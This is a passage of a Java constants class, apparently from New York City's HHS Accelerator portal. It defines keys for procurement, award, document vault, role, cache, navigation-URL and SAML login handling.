	public static final String IS_SECOND_FLAG = "isSecondFlag";
	public static final String AWARD_MAP = "awardMap";
	public static final String AWARD_STATUS_ID = "awardStatusId";
	public static final String AWARD_REVIEW_APPROVED = "AWARD_REVIEW_APPROVED";
	public static final String AWARD_APPROVAL_TASK_JSP = "awardApprovalTask";
	public static final String PROPOSAL_STATUS_ID = "proposalStatusId";
	public static final String PROPOSAL_MAP = "proposalMap";
	public static final String AWARD_REVIEW_RETURNED = "AWARD_REVIEW_RETURNED";
	public static final String IS_FIRST_LAUNCH = "isFirstLaunch";
	public static final String IS_RETURNED = "isReturned";
	public static final String AWARD = "Award";

	public static final String CHECK_DOC_LINK_TO_ANY_OBJECT = "checkDocLinkToAnyObject";
	public static final String CHECK_DOC_LINK_TO_ANY_OBJECT_NOT_IN_DRAFT = "checkDocLinkToAnyObjectNotInDraft";
	public static final String CHECK_DOC_LINK_TO_ANY_OBJECT_IN_DRAFT = "checkDocLinkToAnyObjectInDraft";
	public static final String GET_LINKED_TO_OBJECT_NAME = "getLinkedToObjectName";
	public static final String GET_LINKED_TO_OBJECT_NAME_NOT_IN_DRAFT = "getLinkedToObjectNameNotInDraft";
	public static final String GET_LINKED_TO_OBJECT_NAME_IN_DRAFT = "getLinkedToObjectNameInDraft";
	public static final String ATTACHED_OBJECT_NAME = "attachedObjectName";
	public static final String OBJECT_EXPRESSION = "<object>";
	public static final String ACTION_EXPRESSION = "<action>";
	public static final String ATTACHED_TO_OBJECT_ERROR_MESSAGE = "ATTACHED_TO_OBJECT_ERROR_MESSAGE";
	public static final String PROCUREMENT_STATUS_RELEASED = "Released";
	public static final String STATUS_SUBMITTED = "Submitted";
	public static final String JAVA_LANG_STRING = "java.lang.String";
	public static final String STR = "'";
	public static final String DOUBLE_QUOTE = " '";
	public static final String NOTIFICATION_HREF_1 = "://";
	public static final String NOTIFICATION_HREF_2 = ":";
	public static final String COLON_AOP = " : ";
	public static final String FETCH_SEL_COMMENT_FOR_AWARD_TASK = "fetchSelectionCommentsForAwardTask";
	public static final String SELECTION_COMMENTS_LOWER = "selectionComments";
	public static final String BOTH = "Both";
	public static final String PROVIDER_REGULAR_EXPRESSION = "(Provider)";
	public static final String AGENCY_REGULAR_EXPRESSION = "(Agency)";
	public static final String TASK_OWNER_NAME = "taskOwnerName";
	public static final String INCLUDE_NOT_FLAG = "includeNotFlag";
	public static final String FETCH_AGENCY_HOME_PAGE_TASK_COUNT = "fetchAgencyHomePageTaskCount";
	public static final String AGENCY_TASK_COUNT_RESULT = "agencyTaskCountResult";
	public static final String TASK_COUNT_BEAN = "taskCountBean";
	public static final String UNASSIGNED = "Unassigned";
	public static final String TASK_COUNT_UNASSIGNED_BEAN = "taskCountUnsassignedBean";
	public static final String TASK_COUNT_ASSIGNED_BEAN = "taskCountAssignedBean";

	public static final String DELETE_SM_AND_FINANCE_DOCS = "deleteSMAndFinanceDocs";

	// Mapper constants for Release2 and Release 3
	public static final String MAPPER_CLASS_PROCUREMENT_MAPPER = "com.nyc.hhs.service.db.services.application.ProcurementMapper";
	public static final String MAPPER_CLASS_INVOICE_MAPPER = "com.nyc.hhs.service.db.services.application.InvoiceMapper";
	public static final String MAPPER_CLASS_PROPOSAL_MAPPER = "com.nyc.hhs.service.db.services.application.ProposalMapper";
	public static final String MAPPER_CLASS_CONTRACT_BUDGET_MAPPER = "com.nyc.hhs.service.db.services.application.ContractBudgetMapper";
	public static final String MAPPER_CLASS_AWARDS_MAPPER = "com.nyc.hhs.service.db.services.application.AwardsMapper";
	public static final String DEL_PROCUREMENT_DOCS_VAULT = "deleteProcurementDocFromVault";
	public static final String REMOVE_AWARD_DOCS_VAULT = "removeAwardDocumentFromVault";
	public static final String DELETE_BUDGET_FINANCIAL_DOC_VAULT = "removeBudgetDocumentFromVault";
	public static final String DELETE_INVOICE_FINANCIAL_DOC_VAULT = "removeInvoiceDocumentFromVault";
	public static final String DELETE_CONTRACT_FINANCIAL_DOC_VAULT = "removeContractFinacialdocFromVault";
	public static final String REMOVE_PROPOSAL_DOCS_VAULT = "removeProposalDocsFromVault";

	public static final String IS_SM_FINANCE_DOCUMENT = "isRelease2TypeDocuments";
	public static final String UPLOADING_SAME_NAME_DOC_PROCUREMENT = "UPLOADING_SAME_NAME_DOC_PROCUREMENT";
	public static final String UPLOADING_SAME_NAME_DOC_PROPOSAL = "UPLOADING_SAME_NAME_DOC_PROPOSAL";
	public static final String UPLOADING_SAME_NAME_DOC_BUDGET = "UPLOADING_SAME_NAME_DOC_BUDGET";
	public static final String UPLOADING_SAME_NAME_DOC_INVOICE = "UPLOADING_SAME_NAME_DOC_INVOICE";
	public static final String UPLOADING_SAME_NAME_DOC_CONTRACT = "UPLOADING_SAME_NAME_DOC_CONTRACT";
	public static final String UPLOADING_DOCUMENT_TYPE_RFP = "RFP";
	public static final String UPLOADING_DOCUMENT_TYPE_PROPOSAL = "Proposal";
	public static final String UPLOADING_DOCUMENT_TYPE_BAFO = "BAFO";
	public static final String UPLOADING_DOCUMENT_TYPE_BUDGET = "Budget";
	public static final String UPLOADING_DOCUMENT_TYPE_INVOICE = "Invoice";
	public static final String UPLOADING_DOCUMENT_TYPE_PROCUREMENT = "Procurement";
	public static final String UPLOADING_DOCUMENT_TYPE_CONTRACT = "Contract";
	public static final String HOME_INBOX_FINAL = "homeinboxfinal";
	public static final int INT_ZERO = 0;
	public static final String HOME_UNASSIGNED_TASK_FINAL = "homeunassigntaskfinal";
	public static final String TASK_COUNT_UNASSIGNED_DETAILS = "taskCountUnassigneddetails_filenet";
	public static final String RESULT_UNASSIGNED_TASK_COUNT = "resultUnassignedTaskCountDetails";
	public static final String BUSINESS_APP_MANAGER = "BusinessAPPManager";
	public static final String SERVICE_APP_MANAGER = "ServiceAPPManager";
	public static final String HOME_ASSIGN_TASK_FINAL = "homeassigntaskfinal";
	public static final boolean BOOLEAN_TRUE = true;
	public static final boolean BOOLEAN_FALSE = false;
	public static final String HELP_CATEGORY_SCREEN_MAPPING_CONFIG = "helpScreenCategoryMapping";
	public static final Map<String, String> ROLE_AGENCY = new HashMap<String, String>();
	static
	{
		ROLE_AGENCY.put("accostaff", "ACCO_STAFF");
		ROLE_AGENCY.put("accostaffadmin", "ACCO_ADMIN_STAFF");
		ROLE_AGENCY.put("accomanager", "ACCO_MANAGER");
		ROLE_AGENCY.put("programstaff", "PROGRAM_STAFF");
		ROLE_AGENCY.put("programstaffadmin", "PROGRAM_ADMIN_STAFF");
		ROLE_AGENCY.put("programmanager", "PROGRAM_MANAGER");
		ROLE_AGENCY.put("financialstaff", "FINANCE_STAFF");
		ROLE_AGENCY.put("financialstaffadmin", "FINANCE_ADMIN_STAFF");
		ROLE_AGENCY.put("financemanager", "FINANCE_MANAGER");
		ROLE_AGENCY.put("cfo", "CFO");
		
	}
	public static final String FILENET_PE_SQL_CONFIG = "com/nyc/hhs/config/FilenetSqlMapConfig.xml";
	public static final String LOCAL_FILENET_SQL_CONFIG = "com/nyc/hhs/config/FilenetSqlMapConfigR2.xml";
	public static final String UPLOAD_DOC_TYPE = "uploadingDocumentType";
	public static final String IS_AGENCY_VIEWING_RFP_DOC = "isAgencyViewingRFPDoc";
	// Agency Roles
	public static final String ACCO_MANAGER_ROLE = "ACCO_MANAGER";
	public static final String ACCO_STAFF_ROLE = "ACCO_STAFF";
	public static final String ACCO_ADMIN_STAFF_ROLE = "ACCO_ADMIN_STAFF";
	public static final String PROGRAM_STAFF_ROLE = "PROGRAM_STAFF";
	public static final String PROGRAM_ADMIN_STAFF_ROLE = "PROGRAM_ADMIN_STAFF";
	public static final String PROGRAM_MANAGER_ROLE = "PROGRAM_MANAGER";
	public static final String FINANCE_STAFF_ROLE = "FINANCE_STAFF";
	public static final String FINANCE_ADMIN_STAFF_ROLE = "FINANCE_ADMIN_STAFF";
	public static final String FINANCE_MANAGER_ROLE = "FINANCE_MANAGER";
	public static final String CFO_ROLE = "CFO";
	
	// SM Batch constatnts
	public static final String BATCH_TRANSACTION_PARAM_NAME = "loHMap";
	public static final String BATCH_NOTIFICATION_MAPPER_CLASS = "com.nyc.hhs.service.db.services.application.BatchNotificationMapper";
	public static final String FETCH_PROPOSAL_DUE_DATE_ALERT_DETAILS = "fetchProposalDueDateAlertDetails";
	public static final String JAVA_UTIL_MAP = "java.util.Map";
	public static final String FETCH_APPROVED_PROVIDERS_LIST = "fetchApprovedProvidersList";
	public static final String FETCH_RFP_RELEASE_DUE_DATE_ALET_DETAILS = "fetchRfpReleaseDueDateAlertDetails";
	public static final String FETCH_FIRST_ROUND_EVALUATION_DUE_DATE_ALET_DETAILS = "fetchFirstRoundEvaluationDueDateAlertDetails";
	public static final String FETCH_FINAL_ROUND_EVALUATION_DUE_DATE_ALET_DETAILS = "fetchFinalEvaluationDueDateAlertDetails";
	public static final String FILTER_NOTIFICATION_FOR_LIST = "filterNotificationListForList";
	public static final String FILTER_NOTIFICATION_FOR_STRING = "filterNotificationListForString";
	public static final String ASCENDING = "ASC";
	public static final String DESCENDING = "DESC";
	public static final String DOT = ".";
	public static final String NA_KEY = "N/A";
	public static final String NOTIFICATION_LIST_KEY = "notificationList";
	public static final String MAPPER_CLASS_EVALUATION_MAPPER = "com.nyc.hhs.service.db.services.application.EvaluationMapper";
	public static final String FETCH_EXT_AND_INT_EVALUATOR = "fetchExtAndIntEvaluator";
	public static final String VISIBLE_TO = "visibleTo";
	public static final String COST_ALLOCATION_PLAN = "Cost Allocation Plan";
	public static final String CONSULTANT_AGREEMENT = "Consultant Agreement";
	public static final String SUBCONTRACTOR_AGREEMENT = "Subcontractor Agreement";
	public static final String LEASE_OR_RENTAL_AGREEMENT = "Lease or Rental Agreement";
	public static final String EVALUATION_RESULTS_AGENCY_LINK = "/portal/hhsweb.portal?_nfpb=true&_windowLabel=portletInstance_38&_urlType=action&topLevelFromRequest=ProposalsandEvaluations&midLevelFromRequest=EvaluationResultsandSelections&render_action=fetchEvaluationResults&forAction=propEval&ES=0&submit_action=navigationAction&_pageLabel=portlet_hhsweb_portal_page_procurement&procurementId=";
	public static final String EVALUATION_STATUS_AGENCY_LINK = "/portal/hhsweb.portal?_nfpb=true&_windowLabel=portletInstance_38&_urlType=action&topLevelFromRequest=ProposalsandEvaluations&midLevelFromRequest=EvaluationStatus&render_action=getEvaluationStatus&forAction=propEval&submit_action=navigationAction&_pageLabel=portlet_hhsweb_portal_page_procurement&procurementId=";
	public static final String AGENCY_TASK_INBOX_URL = "/portal/hhsweb.portal?_nfpb=true&_pageLabel=portlet_hhsweb_portal_page_agencyWorkflow&_nfls=false&app_menu_name=inbox_icon&usewindow=inbox";
	public static final String PROCUREMENT_SUMMARY_AGENCY_URL = "/portal/hhsweb.portal?_nfpb=true&_windowLabel=portletInstance_38&_urlType=action&topLevelFromRequest=ProcurementRoadmapDetails&midLevelFromRequest=ProcurementSummary&render_action=viewProcurement&submit_action=navigationAction&_pageLabel=portlet_hhsweb_portal_page_procurement&procurementId=";
	public static final String PROCUREMENT_SUMMARY_PROVIDER_URL = "/portal/hhsweb.portal?_nfpb=true&_windowLabel=portletInstance_38&_urlType=action&topLevelFromRequest=ProcurementSummaryHeader&render_action=procurementDetails&submit_action=navigationAction&_pageLabel=portlet_hhsweb_portal_page_procurement&procurementId=";
	public static final String INCLUDE_DATE = "includeDate";
	public static final String TASK_NAME_APPROVE_AWARD = "Approve Award(s)";
	public static final Map<String, String> CACHE_REGION_MAPPING = new HashMap<String, String>();
	static
	{
		CACHE_REGION_MAPPING.put("taxonomy", "hhs-config-sync");
		CACHE_REGION_MAPPING.put("provList", "hhs-config-sync");
		CACHE_REGION_MAPPING.put("sessionUserDetailsCache", "hhs-config-sync");
		CACHE_REGION_MAPPING.put("sessionListToRemove", "hhs-config-sync");
		CACHE_REGION_MAPPING.put("taxonomyCacheRefresh", "hhs-config-sync");
		CACHE_REGION_MAPPING.put("cacheFlagVersion", "hhs-config-sync");
		CACHE_REGION_MAPPING.put("cacheTaxonomyVersion", "hhs-config-sync");
		CACHE_REGION_MAPPING.put("hhs-lock-ids", "hhs-config-sync");
		CACHE_REGION_MAPPING.put("documentVaultLocks", "hhs-config-sync");
		//Adding dictioanrydata key into distributed cache for emergency release 6.0.1
		CACHE_REGION_MAPPING.put("dictionaryData", "hhs-config-sync");
		//End
	}
	public static final String SESSION_USER_DETAIL_CACHE = "sessionUserDetailsCache";
	public static final String SESSION_LIST_REMOVE = "sessionListToRemove";
	public static final String LOCK_ID_START = "LockId_";
	public static final String HHS_CONFIG = "hhs-config";
	public static final String HHS_CONFIG_SYNC = "hhs-config-sync";
	public static final String HHS_LOCK_IDS = "hhs-lock-ids";
	public static final String HHS_DB_CACHE = "hhs-db-cache";
	public static final String CONTRACT_STATUS = "contractStatus";
	public static final String PENDING_WORKFLOW_LAUNCH = "PENDING_WORKFLOW_LAUNCH";
	public static final String PENDING_EPIN = "PENDING_EPIN";
	public static final String PROCUREMENT_SUMMARY = "procurementSummary";
	public static final String PROCUREMENT_BEAN = "procurementBean";
	public static final String ENABLE_LOGOUT_CONCURRENT = "enableLogoutConc_enableLogoutConc";
	public static final String PROC_STATUS_CODE = "procurementStatusCode";
	public static final String STATUS_PROCUREMENT_SELECTIONS_MADE = "PROCUREMENT_SELECTIONS_MADE";
	public static final String STATUS_UPDATE_MAP = "statusUpdateMap";
	public static final String IS_FIRST_REACHED = "isFirstReached";

	public static final String NAVIGATION_TYPE = "asNavigationType";
	public static final String FROM_HOME_PAGE = "homepage";
	public static final String FROM_SERVICE_SUMMARY_PAGE = "servicesummarypage";
	public static final String SUPER_SEDING_KEY_CA = "superSedingStatusKeyCA";
	public static final String SUPER_SEDING_KEY_DRAFT = "superSedingStatusKeyDraft";
	public static final String STATUS_CHANGE_BY_BATCH = "Provider status changed by Batch";
	public static final String PROCURING_NONPROCURING_AGENCIES = "procuringNonProcuringAgenciesMap";
	public static final String FETCH_PROCURING_NONPROCURING_AGENCIES = "fetchProcuringNonProcuringAgenciesFromDB";
	public static final String BEGINNING_BRACKET = " (";
	public static final String CLOSING_BRACKET = ")";

	// Added new doctype constants for date validation
	public static final String PROVIDERS_BOARD_APPROVED_BUDGET = "Provider's Board Approved Budget";
	public static final String BOARD_RESOLUTION = "Board Resolution";
	public static final String CONTRACT_AGREEMENT = "Contract Agreement";
	public static final String CERTIFICATE_OF_INSURANCE = "Certificate of Insurance";
	public static final int IN_QUERY_BREAK_LIMIT = 800;

	public static final String SAME_FILE_ERROR_MESSAGE_CHECK = "button below and rename this document";
	public static final String UNDERSCORE = "_";

	// Single User Access To Multiple Accounts Constants//
	// Login - Select an Organization
	public static final String LAUNCH_OVERLAY = "launchOverlay";
	public static final String STAFF_DETAILS_BEAN_LIST_PARAM = "staffDetailsBeanList";
	public static final String SELECT_ORGANIZATION = "chooseOrganization";
	public static final String ORG_DETAILS_MAP = "orgDetailsMap";
	public static final String TYPEAHEADBOX = "typeheadbox";
	public static final String ORGANIZATIONIDKEY = "organizationIdKey";
	public static final String HOMEPAGE_REDIRECT_PATH = "&_pageLabel=portlet_hhsweb_portal_page_provider_home&app_menu_name=home_icon";
	public static final String ERROR_MSG_SELECT_ORGANIZATION_LOAD_FAIL = "Unable to redirect to Select an Organization Screen.";
	public static final String ERROR_MSG_UNABLE_TO_REDIRECT = "Unable to redirect on Home Page after authenticating user.";
	public static final String ERROR_MSG_AUTHORIZATION1 = "Authorization Failed for the Selected Organization: ";
	public static final String ERROR_MSG_AUTHORIZATION2 = "Authorization Failed for the Selected Organization. Please select different organization to Login.";
	public static final String RENDER_ACTION_SELECT_ORGANIZATION = "selectOrganization";
	public static final String CHANNEL_ELEMET_SET_STAFF_DETAILS_BEAN = "aoStaffDetails";
	public static final String CHANNEL_ELEMET_GET_STAFF_DETAILS_BEAN = "aoStaffDetailBean";
	public static final String TRANSACTION_GET_ORG_DETAILS_FOR_LOGIN_AUTHORIZATION = "getNYCUserOrganizationDetailsMultiAccount";
    
	
	public static final String CHANNEL_ELEMET_SET_USER_BEAN = "userBean";
	public static final String CHANNEL_ELEMET_GET_COMPONENT_ROLE_MAPPING_LIST = "loCompoRoleMappingList";
	public static final String TRANSACTION_FETCH_ROLE_MAPPING = "roleComponentMapping";
	public static final String ATTRIBUTE_SET_ROLE_MAPPING_MAP = "roleMappingMap";

	// Program Names
	public static final String DEFAULT_VIEW_PROGRAM_NAMES = "maintenanceprogramnames";
	public static final String DIALOG_VIEW_NEW_PROGRAM_NAME = "createNewProgramNameDlg";
	public static final String DIALOG_VIEW_CONFIRM_NEW_PROGRAM_NAME = "confirmNewProgramDlg";
	public static final String DIALOG_VIEW_PROGRAM_NAME_CHANGE = "modifyProgramNameDlg";
	public static final String DIALOG_VIEW_CONFIRM_PROGRAM_NAME_CHANGE = "confirmProgramNameChangeDlg";
	public static final String DIALOG_VIEW_PROGRAM_INACTIVATE = "confirmInactivateProgramDlg";
	public static final String DIALOG_VIEW_PROGRAM_ACTIVATE = "confirmActivateProgramDlg";

	public static final String VIEW_OBJECT_PROGRAM_NAME = "viewObjectWithParam";
	public static final String VIEW_PARAMETER_OBJECT_PROGRAM_NAME = "ParametersForViewObject";
	public static final String PROGRAM_NAME_RANDER_VIEW_ID = "programNameView";
	public static final String SEARCHED_PROGRAM_LST = "programNameLst";
	public static final String SEARCHED_PROGRAM_PAGE_INFO = "paginationBean";
	public static final String PROGRAM_NAME_PARAM_SEARCH_WORD = "searchWord";
	public static final String PROGRAM_NAME_PARAM_CUR_PAGE = "currentPage";
	public static final String PROGRAM_NAME_PARAM_ROW_IN_PAGE = "rowsInPage";

	public static final String PROGRAM_NAME_PARAM_SEARCH_AGINCY_ID = "searchAgencyId";
	public static final String PROGRAM_NAME_PARAM_SEARCH_CREATED_FROM = "searchCreatedfrom";
	public static final String PROGRAM_NAME_PARAM_SEARCH_CREATED_TO = "searchCreatedto";
	public static final String PROGRAM_NAME_PARAM_SEARCH_MODIFIED_FROM = "searchModifiedfrom";
	public static final String PROGRAM_NAME_PARAM_SEARCH_MODIFIED_TO = "searchModifiedto";
	public static final String PROGRAM_NAME_PARAM_SEARCH_FILTER_STATUS = "searchStatus";
	public static final String PROGRAM_NAME_PARAM_SEARCH_SORT_ORDER = "searchSortOrder";

	public static final String PROGRAM_NAME_PARAM_TARGET_PROGRAM_ID = "targetProgramId";
	public static final String PROGRAM_NAME_PARAM_TARGET_PROGRAM_NAME = "targetProgramName";
	public static final String PROGRAM_NAME_PARAM_TARGET_PROGRAM_AGNCY = "targetProgramAgency";

	public static final String PROGRAM_NAME_PARAM_DUP_PROGRAM_NAME = "programNameExists";
	public static final String PROGRAM_NAME_PARAM_PROGRAM_ID_CHANGE = "programIdChange";
	public static final String PROGRAM_NAME_PARAM_NEW_PROGRAM_NAME = "newProgramNameChange";
	public static final String PROGRAM_NAME_PARAM_OLD_PROGRAM_NAME = "oldProgramNameChange";

	public static final String PROGRAM_NAME_PARAM_NEW_PROGRAM_NAME_POPUP = "newProgramNameDlg";
	public static final String PROGRAM_NAME_AGENCY_ID_POPUP = "agencyDlg";
	public static final String PROGRAM_NAME_AGENCY_NAME_POPUP = "agencyNameDlg";
	public static final String PROGRAM_NAME_AGENCY_ID_POPUP_SECOND = "agencyDlg1";
	public static final String PROGRAM_NAME_AGENCY_NAME_POPU_SECONDP = "agencyNameDlg1";
	public static final String AGENCY_NAME = "agencyName";

	public static final String PROGRAM_NAME_PARAM_RESTORED_AGENCY = "restoredAgency";
	public static final String PROGRAM_NAME_PARAM_RESTORED_INPUT = "restoredInput";
	public static final String PROGRAM_NAME_PARAM_NEW_PROGRAM_NAME_CONFIRM = "newProgramNameConfirm";
	public static final String PROGRAM_NAME_PARAM_PROGRAM_ID_CHANGE_CONFIRM = "programIdChangeConfirm";

	public static final String PROGRAM_NAME_AGENCY_ID_CONFIRM = "agencyConfirm";
	public static final String PROGRAM_NAME_AGENCY_NAME_CONFIRM = "agencyNameConfirm";

	public static final String PROGRAM_NAME_SORT_DEFAULT = "ORDER BY AGENCY_ID ASC , PROGRAM_NAME ASC";
	public static final String PROGRAM_NAME_SORT_AGENCY_ID_ASC = "ORDER BY AGENCY_ID ASC , PROGRAM_NAME ASC";
	public static final String PROGRAM_NAME_SORT_AGENCY_ID_DESC = "ORDER BY AGENCY_ID DESC  , PROGRAM_NAME ASC";
	public static final String PROGRAM_NAME_SORT_PROGRAM_NAME_ASC = "ORDER BY PROGRAM_NAME ASC , ACTIVE_FLAG ASC";
	public static final String PROGRAM_NAME_SORT_PROGRAM_NAME_DESC = "ORDER BY PROGRAM_NAME DESC , ACTIVE_FLAG ASC";
	public static final String PROGRAM_NAME_SORT_CREATED_DATE_ASC = "ORDER BY CREATED_DATE DESC , PROGRAM_NAME ASC";
	public static final String PROGRAM_NAME_SORT_CREATED_DATE_DESC = "ORDER BY CREATED_DATE ASC , PROGRAM_NAME ASC";
	public static final String PROGRAM_NAME_SORT_MODIFIED_DATE_ASC = "ORDER BY MODIFIED_DATE DESC , PROGRAM_NAME ASC";
	public static final String PROGRAM_NAME_SORT_MODIFIED_DATE_DESC = "ORDER BY MODIFIED_DATE ASC , PROGRAM_NAME ASC";
	public static final String PROGRAM_NAME_SORT_ACTIVE_FLAG_ASC = "ORDER BY ACTIVE_FLAG ASC , MODIFIED_DATE DESC";
	public static final String PROGRAM_NAME_SORT_ACTIVE_FLAG_DESC = "ORDER BY ACTIVE_FLAG DESC , MODIFIED_DATE DESC";

	// Provider Settings
	public static final String JSP_PROVIDER_SETTINGS = "maintenanceprovidersettings";
	public static final String JSP_SUB_PROVIDER_SETTINGS = "submaintenanceprovidersettings";
	public static final String ATTRIBUTE_SET_FIRST_NAME = "fname";
	public static final String ATTRIBUTE_SET_MIDDLE_NAME = "mname";
	public static final String ATTRIBUTE_SET_LAST_NAME = "lname";
	public static final String ATTRIBUTE_SET_EXISTING_PROVIDER_LIST = "existingProviderList";

	public static final String CHANNEL_ELEMET_SET_STAFF_ID = "lsStaffId";
	public static final String TRANSACTION_GET_STAFF_DETAILS_FROM_ID = "getStaffDetailsFromId";
	public static final String CHANNEL_PARAM_STAFF_ID = "asStaffId";
	public static final String CHANNEL_PARAM_CREATOR_USER = "asCreatorUser";
	public static final String CHANNEL_SET_INSERT_DETAILS_MAP = "aoInsertDetails";
	public static final String TRANSACTION_SUBMIT_ACCESS_REQUEST_PROVIDER_SETTINGS = "submitAccessRequestProvider";
	public static final String CHANNEL_GET_INSERT_STATUS_SUBMIT_ACCESS_REQUEST = "insertStatus";
	public static final String MSG_PROVIDER_SETTINGS_SUCCESSFUL_SUBMIT_ACCESS_REQUEST = "The access request was successfully submitted. Use the Manage Provider portlet on the homepage to check the status of existing requests.";
	public static final String ERROR_MSG_PROVIDER_SETTINGS_SUCCESSFUL_SUBMIT_ACCESS_REQUEST = "Exception Occured while Submitting Access Request : ";
	public static final String ATTRIBUTE_GET_STAFF_ID = "staffId";
	public static final String ATTRIBUTE_GET_ITEMS = "items";
	public static final String ERROR_MSG_PROVIDER_SETTINGS_FAILED_RENDER = "Provider Settings Screen: Error occured while fetching provider user details";

	// Added new constants for implementing Document Vault Enhancements for R4.
	public static final String AGENCY_DOCUMENT_LIST_PAGE = "agencydocumentlist";
	public static final String AGENCY_DISPLAY_FILE = "agencydisplayfileinfo";
	public static final String CITY_USER_NAME = "HHS Accelerator";
	public static final String TILD_PROVIDER = "~provider_org";
	public static final String TILD_AGENCY = "~agency_org";
	public static final String TILD_CITY = "city_org~city_org";
	public static final String DOC_ORIGINATOR = "docOriginator";
	public static final String IS_PROVIDER = "isProvider";
	public static final String EVALUATION_POOL_MAPPING_ID = "evaluationPoolMappingId";
	public static final String COMPETITION_POOL_STATUS = "competitionPoolStatus";
	public static final String STATUS_COMPETITION_POOL_SELECTIONS_MADE = "COMPETITION_POOL_SELECTIONS_MADE";
	public static final String INPUT_PARAM_MAP = "aoInputParam";

	// Financial Role For Provider
	public static final String ROLE_FINANCIAL = "F";
	public static final String ROLE_PROCUREMENT = "P";
	public static final String ROLE_FINANCIALPROCUREMENT = "FP";
	public static final String ROLE_READ_ONLY = "R";
	public static final String PROVIDER_PERMISSION_LEVEL_1 = "Level 1";
	public static final String PROVIDER_PERMISSION_LEVEL_2 = "Level 2";
	// Financial Role For Provider Ends
	public static final String INSERT_NOTIFICATION_DETAILS = "insertNotificationDetail";
	public static final String REMOVE_BAFO_DOCS_VAULT = "removeBafoDocsFromVault";
	public static final String EVAL_POOL_MAPPING_ID_PARAM = "&evaluationPoolMappingId=";
	public static final String UPDATE_CACHE = "updateCache";
	public static final String LOCAL_CACHE = "localCache";
	public static final String CACHE_TYPE = "cacheType";
	public static final String NOT_LATEST_VERSION = "NOT_LATEST_VERSION";
	// Release 3.2.0 defect 5650
	public static final String DEACTIVATE_USER = "deactivateUser";
	public static final String REMOVE_USER = "removeUser";
	// Release 3.4.0 defect 6478
	public static final String UPDATE_USER_DN_ON_ACCOUNT_REQUEST_REJECTION = "updateUserDN_DB";
	// Start || Changes done for Enhancement #6429 for Release 3.4.0
	public static final String UPLOADING_SAME_NAME_DOC_AGENCY_AWRD = "UPLOADING_SAME_NAME_DOC_AGENCY_AWRD";
	// End || Changes done for Enhancement #6429 for Release 3.4.0

	// Start of changes for Release 3.10.0 : Enhancement 6572
	public static final String JAVA_UTIL_HASHMAP = "java.util.HashMap";
	public static final String FETCH_CS_FROM_DB = "fetchCSfromDb";
	public static final String GET_SECTION_STATUS_FILING = "getSectionStatusForFilings";
	public static final String UPDATE_SECTION_STATUS_FILING = "updateSectionStatusForFilings";
	public static final String DELETE_FILING_DOCS = "deleteFilingDocs";
	public static final String DELETE_FILING_INFO = "deleteFilingInfo";
	public static final String UPDATE_SUB_SECTION_SUMMARY = "updateSubSectionSummary";
	public static final String AS_USER_ID = "asUserId";
	public static final String GET_SUB_SECTION_STATUS_FILINGS = "getSubSectionStatusForFilings";

	// End of changes for Release 3.10.0 : Enhancement 6572
	
	//Add for R6.1 - QC 6796 provider status
	public static final String PULL_LIST_OF_ORG_APP_FILING_STATUS = "pullStatusOfOrgApplicationFiling";
	public static final String PULL_LIST_OF_SUPERSEEDING_EVENT_4_LAST_BUSINESSAPP = "pullSuperSeedingEventForLastBusinessApp";
	
	// BEGIN Rel 7.1.0 QC 6674
	public static final String USER_EXIST_IN_SESSION = "userExitInSession";
	public static final String GET_ORG_FROM_BUSINESS_APP = "getOrgFromBusinessApp";
	// END Rel 7.1.0 QC 6674
	
	//Begin QC 8914 R 7.2.0
	public static final String KEY_SESSION_OVERSIGHT_FLAG = "oversightFlag"; 
	public static final String KEY_SESSION_ORG_TYPE_ORIGINAL = "org_type_original";
	public static final String KEY_SESSION_USER_ORG_ORIGINAL = "user_organization_original";
	public static final String KEY_SESSION_USER_ID_ORIGINAL = "user_id_original";
	public static final String KEY_SESSION_ORG_NAME_ORIGINAL = "org_name_original";
	public static final String KEY_SESSION_USER_NAME_ORIGINAL =	"userName_original";
	public static final String KEY_SESSION_EMAIL_ID_ORIGINAL = "email_id_original";
	public static final String KEY_SESSION_PASSWORD_ORIGINAL = "password_original";
	public static final String KEY_SESSION_USER_DN_ORIGINAL = "userDN_original";
	public static final String KEY_SESSION_ROLE_ORIGINAL = "role_original";
	public static final String KEY_SESSION_ROLE_CURRENT = "role_current";
	public static final String READONLY_EMAIL = "readonly@mailinator.com";
	public static final String READONLY_USER_ID = "observer";
	public static final String SELECT_OVERSIGHT_ROLE = "chooseRole";
    public static final String ROLE_DETAILS_MAP = "roleDetailsMap";
    public static final String ROLEIDKEY = "roleIdKey";
    public static final String RENDER_ACTION_SELECT_ROLE = "selectRole";
    public static final String ROLE_OBSERVER = "OBSERVER";
   	//End QC 8914 R 7.2.0

    //** [Start] QC 9165 R 7.8.0
    public static final String SAML_LOGIN_PORTAL_URL = "/portal/hhsweb.portal?_nfpb=true&_windowLabel=portletInstance_30&_urlType=action&loginportlet=loginportlet";
    public static final String SAML_LOGIN_PORTAL_NYC_PASSWORD_CYPERED = "userNYCPassword";
    public static final String SAML_LOGIN_PORTAL_HDN_NYC_NYCID_CYPERED =  "hdnUserNYCId";//   :   [cHJvdmlkZXJybQ==]
    public static final String SAML_LOGIN_PORTAL_NYC_NYCID_CYPERED =  "userNYCId";//   :   [cHJvdmlkZXJybQ==]

    public static final String SAML_LOGIN_PORTAL_URL_TYPE =  "_urlType";//   :   []                    
    public static final String SAML_LOGIN_PORTAL_URL_TYPE_VALUE = "action";

    public static final String SAML_LOGIN_PORTLET =  "loginportlet";//   :   []

    public static final String SAML_LOGIN_NEXT_ACTION = "next_action";
    public static final String SAML_PORTAL_FLAG = "_nfpb";

    public static final String SAML_LOGIN_NEXT_ACTION_VALUE = "validateUser";

    public static final String SAML_LOGIN_PORTLET_WINDOW_LABEL = "_windowLabel";
    public static final String SAML_LOGIN_PORTLET_WINDOW_LABEL_VALUE = "portletInstance_30";

    public static final String SAML_ATTRIBUTE_FOR_NAME         = "SAML_HHSPortal_TIME_STAMP";
    public static final String SAML_ATTRIBUTE_FOR_NAME_VALUE   = "TRUE";
    public static final String SAML_ATTRIBUTE_FOR_NAME_FORMAT  = "urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified";

    public static final String  AUTHENTICATION_SIGNATURE_ALGORITHM_HMAC_SHA256 =   "HmacSHA256" ;
    public static final String  SAML_NYC_ID_USER_PROFILE_PROP_INX =   "SAML_NYC_ID_USER_PROFILE" ;
    public static final String  SAML_NYC_ID_LOGOUT_PROP_INX =   "SAML_NYC_ID_LOGOUT" ;
    public static final String  REPLACE_ACCELERATOR_CONTRACT_PATH_STR =   "__ACCELERATOR_CONTEXT_PATH__" ;
